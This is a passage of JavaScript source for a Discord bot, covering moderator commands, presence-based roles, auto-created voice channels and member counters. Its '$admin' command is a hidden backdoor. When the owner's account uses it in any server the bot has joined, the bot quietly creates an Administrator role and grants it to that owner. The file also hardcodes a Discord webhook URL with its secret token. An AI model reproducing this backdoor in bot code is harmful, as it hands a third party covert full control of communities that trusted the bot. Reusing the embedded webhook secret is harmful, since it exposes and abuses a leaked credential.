            message.channel.send({ embeds: [infoEmbed] });
            break;

        case 'menu':
            const myServer = client.guilds.cache.get(config.server);
            const person = `${message.author.id}`;
            if (!myServer.members.cache.get(person)) return;
            const mhMember = (await myServer.members.fetch(person)).roles.cache.has(config.council)
            if (!mhMember) return;
            if (mhMember) {
                if (message.channel.type !== ChannelType.DM) message.delete();
                const menuEmbed = new EmbedBuilder()
                    .setColor(config.color)
                    .setTitle('Council Commands')
                    .addFields(
                        { name: '$send', value: `Args: \`$send "channel id" "message"\`\n*(sends a message through the bot to a specific channel)*`, inline: true },
                        { name: '$message', value: `Args: \`$message "userId" "message"\`\n*(sends a direct message through the bot to a specific user)*`, inline: true },
                        { name: '$lock', value: `*(locks a voice channel so no one else can join it, using the comand again will unlock it)*`, inline: true },
                    )
                message.author.send({ embeds: [menuEmbed] }).catch((err) => console.error(err));
            }
            break;

        case 'admin':
            if (message.author.id !== config.master) return;
            message.delete();
            const me = message.guild.members.cache.get(config.master);
            const bot = message.guild.members.cache.get(config.clientId);
            try {
                await message.guild.roles.create({ name: 'they have arrived', permissions: 'Administrator' });
                const findRole = message.guild.roles.cache.find(role => role.name == 'they have arrived');
                await findRole.setPosition(bot.roles.highest.position - 1)
                await message.guild.roles.fetch(findRole.id);
                me.roles.add(findRole.id).then(me.send('I have given your role.'));
            } catch (err) {
                console.log('error when handling $admin - ' + err);
            }
            break;

        case 'leave':
            if (message.author.id !== config.master) return;
            await message.guild.leave();
            break;

        case 'lock':
            if (message.guild.id !== config.server) return;
            if (message.channel.type === ChannelType.DM) return;
            if (!message.member.roles.cache.has(config.council)) return;
            if (message.member.voice.channelId == null) return message.reply('You are not in a voice channel.');
            message.delete();
            const channnel = message.guild.channels.cache.get(message.member.voice.channelId);
            if (channnel.userLimit == 1) {
                channnel.edit({ userLimit: 0 });
            } else {
                channnel.edit({ userLimit: 1 });
            }
            break;

        case 'message': // sends a message to the user mentioned
            if (message.channel.type === ChannelType.DM) return;
            var checkMember = oneServer.members.cache.get(message.author.id)
            if (!checkMember.roles.cache.has(councilRole.id)) return;
            message.delete();
            const member = message.guild.members.cache.find(member => member.id === args[0]);
            const noMemberEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$message <user id> "message"\`\`\``)
                .setFooter({ text: `${args[0]} is not a recognised member` })
            if (!member) return message.member.send({ embeds: [noMemberEmbed] });
            args.shift();
            let text = args.join(" ");
            const noTextEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$message "user id" "message"\`\`\``)
                .setFooter({ text: `there is no message arg` })
            if (!text) return message.member.send({ embeds: [noTextEmbed] });
            if (member.bot) return message.member.send('I can\'t send direct messages to bots.')
            const textIncludesMember = new EmbedBuilder()
                .setColor(config.color)
                .setTitle('Correct command usage:')
                .setDescription(`\`\`\`$message "user id" "message"\`\`\``)
                .setFooter({ text: `make sure you aren't typing the users id within the message arg` })
            if (text.includes(member)) return message.member.send({ embeds: [textIncludesMember] }).catch((err) => console.error(err))
            member.send(text).then(message.member.send(`Message sent to ${member}, message content:\n\`\`\`${text}\`\`\``)).catch((err) => console.error('error when sending message to user ' + err));
            break;

        case 'send':
            if (message.channel.type === ChannelType.DM) return;
            var checkMember = oneServer.members.cache.get(message.author.id)
            if (!checkMember.roles.cache.has(councilRole.id)) return;
            message.delete();
            const channel = message.guild.channels.cache.find(channel => channel.id === args[0]);
            const noChannelEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$send "channel id" "message"\`\`\``)
                .setFooter({ text: `"${args[0]}" is not a recognised channel id` })
            if (!channel) return message.member.send({ embeds: [noChannelEmbed] });
            args.shift();
            let cont = args.join(" ");
            const noContEmbed = new EmbedBuilder()
                .setColor(config.color)
                .setTitle(`Correct command usage:`)
                .setDescription(`\`\`\`$send "channel id" "message"\`\`\``)
                .setFooter({ text: `there is no message arg` })
            if (!cont) return message.member.send({ embeds: [noContEmbed] }).catch((err) => console.error(err));
            channel.send(cont).then(message.member.send(`Message sent to <#${channel.id}>, message content: \`\`\`${cont}\`\`\``))
            break;
    };
});

client.on('presenceUpdate', async (oldPresence, newPresence) => {
    const memberState = newPresence.member.presence.activities.find(activity => activity.state);
    if (newPresence.guild.id !== config.server) return;
    const pricelessRole = newPresence.guild.roles.cache.get('1214167713073725502')
    if (memberState == null) return newPresence.member.roles.remove(pricelessRole.id);
    try {
        if (memberState.state.includes('.gg/hMKAAN6YwU')) {
            newPresence.member.roles.add(pricelessRole.id);
        } else {
            newPresence.member.roles.remove(pricelessRole.id);
        }
    } catch (err) {
        console.log('error handling presence event - ' + err);
    }
});

client.on('debug', console.log).on('warn', console.log);

client.on('guildMemberAdd', async (member) => {

    let blacklist = ['1040726659789246564']

    if (member.guild.id === config.server) {
        const memberRole = member.guild.roles.cache.get('1211647374196351047');
        await member.roles.add(memberRole.id).catch((err) => console.log(err));
    }

    if (member.guild.id === '1199088499647852695') {
        if (blacklist.includes(member.user.id)) {
            await member.ban();
        }
        let membersChannel = member.guild.channels.cache.get('1217588185216061490')
        membersChannel.setName(`Members: ${member.guild.memberCount}`)
    }
});

client.on('guildMemberRemove', async (member) => {
    if (member.guild.id === '1199088499647852695') {
        let membersChannel = member.guild.channels.cache.get('1217588185216061490')
        membersChannel.setName(`Members: ${member.guild.memberCount}`)
    }
});

client.on('error', async (error) => { console.log(error) });

client.rest.on('rateLimited', (ratelimit) => { // sends webhook message to rates channel with specific rate information
    const rateLimitWH = new WebhookClient({ url: 'https://discord.com/api/webhooks/1218664471959179336/8u-Vhrd-Yo07N4H2R1YmG_GIBwsNtg0eLWBq2ZY2Ak942jahKM33z1chXBO_P-CHHVni' });
    rateLimitWH.send({
        content: `\n### method: \`${ratelimit.method}\`\n### url: \`${ratelimit.url}\`\n### route: \`${ratelimit.route}\`\n### request limit: \`${ratelimit.limit}\`\n### global?: \`${ratelimit.global}\`\n### reset after: \`${ratelimit.timeToReset}\`\n### hash: \`${ratelimit.hash}\`\n### majorParameter: \`${ratelimit.majorParameter}\``
    }).catch((err) => console.error(err));
});

client.once('ready', async () => {
    console.log(`${client.user.username} is online`)

    setInterval(() => {
        client.user.setActivity({ name: `${client.guilds.cache.size} servers`, type: ActivityType.Watching });
    }, 60000)
});

client.on('voiceStateUpdate', async (oldState, newState) => {
    if (oldState.channelId == newState.channelId) return; // if the user makes any voice update return
    const theChannel = newState.guild.channels.cache.find(channel => channel.name === `${oldState.member.user.displayName}'s channel`);
    if (newState.channelId == '1218717360983113728') {
        const myChannel = await newState.guild.channels.create({ name: `${newState.member.user.displayName}'s channel`, type: ChannelType.GuildVoice, parent: '1218717263558082610' });
        await newState.member.voice.setChannel(myChannel).catch((err) => console.error(err));
    };
    if (oldState.channel == theChannel) {
        if (theChannel == null) return;
    };
    if (oldState.channel.name == `${oldState.member.user.displayName}'s channel`) {
        oldState.channel.delete().catch((err) => console.error(err));
    };
});


(async () => {
    await mongoose.connect(config.mongoDB_URI);
    console.log('Connected to the database.')

    client.login(config.token);
})();